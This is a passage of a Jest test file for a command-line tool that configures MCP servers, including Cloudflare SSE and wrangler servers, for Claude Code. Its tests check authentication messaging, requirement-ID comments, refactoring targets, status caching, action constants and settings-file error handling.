    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // The promptSSEServerForCommand should not mention wrangler login as the solution
    // This test will fail because the current message is misleading
    const ssePromptFunction = cliContent.match(
      /promptSSEServerForCommand[\s\S]*?^}/m
    );
    if (ssePromptFunction) {
      const functionContent = ssePromptFunction[0];
      // Should NOT say wrangler login is the solution for SSE servers
      expect(functionContent).not.toMatch(
        /npx wrangler login.*work.*MCP servers/
      );
    }
  });

  test("REQ-402 — provides accurate guidance about wrangler login requirement", () => {
    // Verify that wrangler-type servers still mention wrangler login requirement
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // promptWranglerServerForCommand should mention wrangler login is required
    expect(cliContent).toMatch(/Requires.*npx wrangler login/);

    // But it should be clear this is for the original cloudflare server, not SSE
    expect(cliContent).toMatch(/Cloudflare MCP server/);
  });

  test("REQ-402 — clarifies distinction between cloudflare servers", () => {
    const sseServers = ["cloudflare-bindings", "cloudflare-builds"];

    const wranglerServer = "cloudflare";

    // SSE servers should have different messaging than wrangler server
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Check that SSE servers mention authentication in Claude Code, not wrangler
    expect(cliContent).toMatch(/authenticate in Claude Code using \/mcp/);

    // But wrangler server should still mention wrangler login
    expect(cliContent).toMatch(/npx wrangler login/);
  });

  test("REQ-402 — updates user messaging to be specific about authentication methods", () => {
    // This test will fail until messaging is corrected
    const expectedMessages = [
      "You'll need to authenticate in Claude Code using /mcp", // For SSE
      "Requires: npx wrangler login", // For wrangler type
    ];

    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    expectedMessages.forEach((message) => {
      expect(cliContent).toContain(message);
    });
  });
});

describe("REQ-403 — Documentation - Invalid REQ Reference (P1 Critical)", () => {
  test("REQ-403 — removes or corrects REQ-303 comment reference", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should not reference non-existent REQ-303
    expect(cliContent).not.toContain("REQ-303");
  });

  test("REQ-403 — ensures all REQ ID comments map to actual requirements", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");
    const requirementsContent = fs.readFileSync(
      "requirements/requirements.lock.md",
      "utf8"
    );

    // Find all REQ-XXX references in code
    const reqReferences = cliContent.match(/REQ-\d+/g) || [];

    // Verify each reference exists in requirements
    reqReferences.forEach((reqId) => {
      expect(requirementsContent).toContain(reqId);
    });
  });

  test("REQ-403 — updates comment to reference correct requirement ID", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Comments should reference valid REQ IDs (REQ-400, REQ-401, etc.)
    const validReqIds = [
      "REQ-400",
      "REQ-401",
      "REQ-402",
      "REQ-403",
      "REQ-404",
      "REQ-405",
      "REQ-406",
      "REQ-407",
    ];
    const reqReferences = cliContent.match(/REQ-\d+/g) || [];

    reqReferences.forEach((reqId) => {
      expect(validReqIds).toContain(reqId);
    });
  });
});

describe("REQ-404 — Maintainability - Single Responsibility (P2 Should Fix)", () => {
  test("REQ-404 — buildClaudeMcpCommand should be refactored for single responsibility", () => {
    // This test will fail because buildClaudeMcpCommand currently does both validation and command building
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have separate functions for URL validation and command building
    expect(cliContent).toContain("validateSSEUrl"); // Extracted validation function
    expect(cliContent).toContain("buildSSECommand"); // Extracted command building function
  });

  test("REQ-404 — validateSSEUrl function should exist with clear error handling", () => {
    // This will fail because validateSSEUrl function doesn't exist yet
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have dedicated URL validation function
    expect(cliContent).toMatch(/function validateSSEUrl\s*\([^)]*\)/);

    // Should handle errors clearly
    expect(cliContent).toMatch(/validateSSEUrl[\s\S]*throw new Error/);
  });

  test("REQ-404 — buildSSECommand function should exist for command construction", () => {
    // This will fail because buildSSECommand function doesn't exist yet
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have dedicated command building function for SSE
    expect(cliContent).toMatch(/function buildSSECommand\s*\([^)]*\)/);
  });

  test("REQ-404 — maintains backward compatibility after refactoring", () => {
    // Test that existing functionality still works after refactoring
    const originalSpec = {
      key: "test-server",
      transport: "sse",
      url: "https://test.cloudflare.com/sse",
    };

    // buildClaudeMcpCommand should still work as before
    // This will fail until proper refactoring maintains the interface
    expect(() => {
      const command = buildClaudeMcpCommand(originalSpec, "user", {});
      return command;
    }).not.toThrow();
  });
});

describe("REQ-405 — Testing - Real Integration Coverage (P2 Should Fix)", () => {
  test("REQ-405 — integration tests should verify actual SERVER_SPECS content", () => {
    // This test will fail because current tests only check string presence, not actual functionality
    const { execSync } = require("child_process");

    // Should import and test actual SERVER_SPECS array, not just file contents
    // This requires refactoring to make SERVER_SPECS exportable
    expect(() => {
      expect(Array.isArray(SERVER_SPECS)).toBe(true);
    }).not.toThrow();
  });

  test("REQ-405 — should test actual prompt routing behavior", () => {
    // Test actual routing logic, not just string presence
    const testSpecs = [
      { promptType: "sse", expected: "promptSSEServerForCommand" },
      { promptType: "path", expected: "promptPathServerForCommand" },
      { promptType: "wrangler", expected: "promptWranglerServerForCommand" },
    ];

    // This will fail because we need to test actual routing behavior
    // Should mock the routing function and verify it calls correct handlers
    testSpecs.forEach(({ promptType, expected }) => {
      const mockSpec = { promptType };
      const routedHandler = getPromptHandler(mockSpec); // Function doesn't exist yet
      expect(routedHandler.name).toBe(expected);
    });
  });

  test("REQ-405 — should validate SERVER_SPECS entries against expected schema", () => {
    // This will fail because schema validation doesn't exist
    const validateServerSpec = (spec) => {
      // Should validate required fields based on promptType
      if (spec.promptType === "sse") {
        return spec.transport === "sse" && spec.url && spec.key && spec.title;
      }
      return spec.key && spec.title;
    };

    // Test would need access to actual SERVER_SPECS
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have schema validation helper
    expect(cliContent).toContain("validateServerSpec");
  });

  test("REQ-405 — should test end-to-end SSE server configuration with mock execSync", () => {
    // This will fail because current tests don't mock execSync for integration testing
    const mockExecSync = jest.fn();
    const { execSync } = require("child_process");

    // Should mock execSync and test full configuration flow
    mockExecSync.mockImplementation(() => "mocked command execution");

    const sseSpec = {
      key: "test-sse",
      title: "Test SSE Server",
      promptType: "sse",
      transport: "sse",
      url: "https://test.cloudflare.com/sse",
    };

    // This test structure doesn't exist yet - needs proper mocking setup
    expect(() => {
      const result = configureServerWithMocks(sseSpec, mockExecSync); // Function doesn't exist
      expect(mockExecSync).toHaveBeenCalled();
    }).not.toThrow();
  });
});

describe("REQ-406 — Performance - Efficient Server Lookup (P2 Should Fix)", () => {
  test("REQ-406 — showPostSetupGuide should use efficient lookup instead of O(n) search", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Currently uses some() which is O(n) - should use boolean flag
    // This test will fail because the O(n) search still exists
    expect(cliContent).not.toMatch(
      /SERVER_SPECS\.some\s*\([^)]*transport.*sse/
    );

    // Should have efficient flag-based lookup
    expect(cliContent).toContain("hasCloudflareSSEServers");
  });

  test("REQ-406 — should create hasCloudflareSSEServers boolean flag", () => {
    // This will fail because the boolean flag doesn't exist yet
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should declare boolean flag for efficient lookup
    expect(cliContent).toMatch(/let hasCloudflareSSEServers\s*=/);
    expect(cliContent).toMatch(/hasCloudflareSSEServers\s*=\s*true/);
  });

  test("REQ-406 — should cache server type information during configuration", () => {
    // This will fail because caching logic doesn't exist
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should set flag during server configuration, not search repeatedly
    expect(cliContent).toMatch(
      /hasCloudflareSSEServers\s*=\s*true.*transport.*sse/
    );
  });

  test("REQ-406 — maintains same user experience with improved performance", () => {
    // The user-visible behavior should be identical, just faster
    // This test ensures the showPostSetupGuide output is the same
    const expectedSSEMessage = "CLOUDFLARE SSE AUTHENTICATION";

    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should still show SSE authentication section when relevant
    expect(cliContent).toContain(expectedSSEMessage);
  });
});

describe("REQ-407 — Organization - Clear Server Type Structure (P2 Should Fix)", () => {
  test("REQ-407 — SERVER_SPECS should be organized by server type", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have clear section comments delineating server types
    const expectedSectionComments = [
      "// NPM-based MCP servers",
      "// Wrangler-based servers",
      "// SSE transport servers",
      "// Path-based servers",
    ];

    // This will fail because server types aren't clearly organized
    expectedSectionComments.forEach((comment) => {
      expect(cliContent).toContain(comment);
    });
  });

  test("REQ-407 — should group related servers together", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Extract SERVER_SPECS array content
    const serverSpecsMatch = cliContent.match(
      /const SERVER_SPECS = \[(.*?)\];/s
    );
    expect(serverSpecsMatch).toBeTruthy();

    const serverSpecsContent = serverSpecsMatch[1];

    // Cloudflare servers should be grouped together
    const cloudflareServers = [
      "cloudflare",
      "cloudflare-bindings",
      "cloudflare-builds",
    ];

    // Find positions of cloudflare servers in the array
    const positions = cloudflareServers.map((server) => {
      const match = serverSpecsContent.match(
        new RegExp(`key:\\s*["']${server}["']`)
      );
      return match ? serverSpecsContent.indexOf(match[0]) : -1;
    });

    // They should be consecutive (positions should be close together)
    const sortedPositions = positions
      .filter((p) => p !== -1)
      .sort((a, b) => a - b);

    // This will fail because servers aren't properly grouped
    if (sortedPositions.length > 1) {
      const maxDistance =
        Math.max(...sortedPositions) - Math.min(...sortedPositions);
      expect(maxDistance).toBeLessThan(2000); // Reasonable threshold for being "grouped"
    }
  });

  test("REQ-407 — should ensure consistent properties within server type groups", () => {
    // Test that servers of the same type have consistent property structure
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Extract and parse server specs (simplified)
    const sseServers = ["cloudflare-bindings", "cloudflare-builds"];

    sseServers.forEach((serverKey) => {
      // Each SSE server should have consistent properties
      const serverRegex = new RegExp(
        `{[^}]*key:\\s*["']${serverKey}["'][^}]*}`,
        "s"
      );
      const serverMatch = cliContent.match(serverRegex);

      expect(serverMatch).toBeTruthy();
      const serverDef = serverMatch[0];

      // All SSE servers should have these properties
      expect(serverDef).toMatch(/promptType:\s*["']sse["']/);
      expect(serverDef).toMatch(/transport:\s*["']sse["']/);
      expect(serverDef).toMatch(/url:\s*["']https/);
      expect(serverDef).toMatch(/helpUrl:\s*["']https/);
    });
  });

  test("REQ-407 — adds clear comments delineating server type sections", () => {
    // This will fail because section comments don't exist yet
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have clear section headers
    expect(cliContent).toMatch(/\/\/ === NPM-based MCP servers ===/);
    expect(cliContent).toMatch(/\/\/ === SSE transport servers ===/);
    expect(cliContent).toMatch(/\/\/ === Wrangler-based servers ===/);
  });
});

// REQ-602: Comprehensive test coverage for new functionality
describe("REQ-600 — Enhanced checkServerStatus Error Handling", () => {
  const fs = require("fs");
  const path = require("path");
  const os = require("os");

  const TEST_SERVER_KEY = "test-server";
  const TEMP_SETTINGS_DIR = "/tmp/test-claude-settings";
  const TEMP_SETTINGS_PATH = path.join(TEMP_SETTINGS_DIR, "settings.json");

  beforeEach(() => {
    // Clean up any existing test files
    if (fs.existsSync(TEMP_SETTINGS_PATH)) {
      fs.unlinkSync(TEMP_SETTINGS_PATH);
    }
    if (fs.existsSync(TEMP_SETTINGS_DIR)) {
      fs.rmdirSync(TEMP_SETTINGS_DIR);
    }
  });

  afterEach(() => {
    // Clean up test files
    if (fs.existsSync(TEMP_SETTINGS_PATH)) {
      fs.unlinkSync(TEMP_SETTINGS_PATH);
    }
    if (fs.existsSync(TEMP_SETTINGS_DIR)) {
      fs.rmdirSync(TEMP_SETTINGS_DIR);
    }
  });

  test("REQ-600 — should handle missing settings file gracefully", () => {
    // Test when .claude/settings.json doesn't exist
    const { checkServerStatus } = require("./cli.js");
    const result = checkServerStatus(TEST_SERVER_KEY);

    expect(result.exists).toBe(false);
    expect(result.status).toBe("not_configured");
    expect(result.message).toBe("Claude settings not found");
  });

  test("REQ-600 — should handle file permission errors with specific error type", () => {
    // Create directory but not file to test file read error
    fs.mkdirSync(TEMP_SETTINGS_DIR, { recursive: true });
    fs.writeFileSync(TEMP_SETTINGS_PATH, "test", { mode: 0o000 }); // No read permissions

    // Mock HOME to use temp directory
    const originalHome = os.homedir;
    os.homedir = () => "/tmp/test-claude-settings/..";

    const { checkServerStatus } = require("./cli.js");
    const result = checkServerStatus(TEST_SERVER_KEY);

    expect(result.exists).toBe(false);
    expect(result.status).toBe("error");
    expect(result.errorType).toBe("file_permission");
    expect(result.message).toBe("Cannot read Claude settings file");

    // Restore original function
    os.homedir = originalHome;

    // Clean up - restore permissions to delete
    fs.chmodSync(TEMP_SETTINGS_PATH, 0o644);
  });

  test("REQ-609 — should handle malformed JSON with specific error type", () => {
    // Create settings file with invalid JSON
    fs.mkdirSync(TEMP_SETTINGS_DIR, { recursive: true });
    fs.writeFileSync(TEMP_SETTINGS_PATH, "{ invalid json }");

    const originalHome = os.homedir;
    os.homedir = () => "/tmp/test-claude-settings/..";

    const { checkServerStatus } = require("./cli.js");
    const result = checkServerStatus(TEST_SERVER_KEY);

    expect(result.exists).toBe(false);
    expect(result.status).toBe("error");
    expect(result.errorType).toBe("json_parsing");
    expect(result.message).toBe("Invalid Claude settings format");

    os.homedir = originalHome;
  });

  test("REQ-609 — should prevent prototype pollution with JSON validation", () => {
    // Test with various malicious JSON structures
    const maliciousInputs = ["null", "[]", '"string"', "42"];

    fs.mkdirSync(TEMP_SETTINGS_DIR, { recursive: true });
    const originalHome = os.homedir;
    os.homedir = () => "/tmp/test-claude-settings/..";

    const { checkServerStatus } = require("./cli.js");

    maliciousInputs.forEach((input) => {
      fs.writeFileSync(TEMP_SETTINGS_PATH, input);
      const result = checkServerStatus(TEST_SERVER_KEY);

      expect(result.exists).toBe(false);
      expect(result.status).toBe("error");
      expect(result.errorType).toBe("json_validation");
      expect(result.message).toBe("Invalid Claude settings structure");
    });

    os.homedir = originalHome;
  });

  test("REQ-605 — should return enhanced status messaging for configured servers", () => {
    // Create valid settings file with server config
    const validSettings = {
      mcpServers: {
        [TEST_SERVER_KEY]: {
          command: "npx",
          args: ["-y", "@test/server"],
          env: {},
        },
      },
    };

    fs.mkdirSync(TEMP_SETTINGS_DIR, { recursive: true });
    fs.writeFileSync(
      TEMP_SETTINGS_PATH,
      JSON.stringify(validSettings, null, 2)
    );

    const originalHome = os.homedir;
    os.homedir = () => "/tmp/test-claude-settings/..";

    const { checkServerStatus } = require("./cli.js");
    const result = checkServerStatus(TEST_SERVER_KEY);

    expect(result.exists).toBe(true);
    expect(result.status).toBe("configured_needs_auth");
    expect(result.message).toBe(
      "Server configured, authentication required in Claude Code"
    );
    expect(result.config).toBeDefined();

    os.homedir = originalHome;
  });
});

describe("REQ-607 — Server Status Caching", () => {
  test("REQ-607 — should cache server status to avoid duplicate checks", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have caching mechanism
    expect(cliContent).toContain("serverStatusCache");
    expect(cliContent).toMatch(/serverStatusCache\.has\(/);
    expect(cliContent).toMatch(/serverStatusCache\.get\(/);
    expect(cliContent).toMatch(/serverStatusCache\.set\(/);
  });

  test("REQ-607 — should use Map for caching implementation", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should declare Map for caching
    expect(cliContent).toMatch(/serverStatusCache.*=.*new Map\(\)/);
  });
});

describe("REQ-608 — Action Type Constants", () => {
  test("REQ-608 — should define ACTION_TYPES constants", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have ACTION_TYPES constant
    expect(cliContent).toContain("ACTION_TYPES");
    expect(cliContent).toMatch(/ACTION_TYPES\s*=\s*\{/);
    expect(cliContent).toContain("CONFIGURE:");
    expect(cliContent).toContain("SKIP:");
    expect(cliContent).toContain("DISABLE:");
    expect(cliContent).toContain("ALREADY_CONFIGURED:");
  });

  test("REQ-608 — should use constants instead of magic strings in promptSSEServerForCommand", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should use constants instead of magic strings
    expect(cliContent).toContain("ACTION_TYPES.ALREADY_CONFIGURED");
    expect(cliContent).toContain("ACTION_TYPES.CONFIGURE");
    expect(cliContent).toContain("ACTION_TYPES.SKIP");
    expect(cliContent).toContain("ACTION_TYPES.DISABLE");
  });

  test("REQ-608 — should use constants in main configuration loop", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Main loop should use constants for action checking
    expect(cliContent).toMatch(
      /serverConfig\.action === ACTION_TYPES\.CONFIGURE/
    );
    expect(cliContent).toMatch(
      /serverConfig\.action === ACTION_TYPES\.DISABLE/
    );
    expect(cliContent).toMatch(
      /serverConfig\.action === ACTION_TYPES\.ALREADY_CONFIGURED/
    );
  });
});

describe("REQ-602 — Already Configured Action Flow", () => {
  test("REQ-602 — should handle already_configured action in main configuration loop", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should have already_configured handling
    expect(cliContent).toMatch(/ACTION_TYPES\.ALREADY_CONFIGURED/);
    expect(cliContent).toContain("configuredServers.push(spec.title)");
  });

  test("REQ-602 — should track already configured servers in summary", () => {
    const fs = require("fs");
    const cliContent = fs.readFileSync("bin/cli.js", "utf8");

    // Should add to configuredServers array
    expect(cliContent).toMatch(/configuredServers\.push\(spec\.title\)/);
  });
});
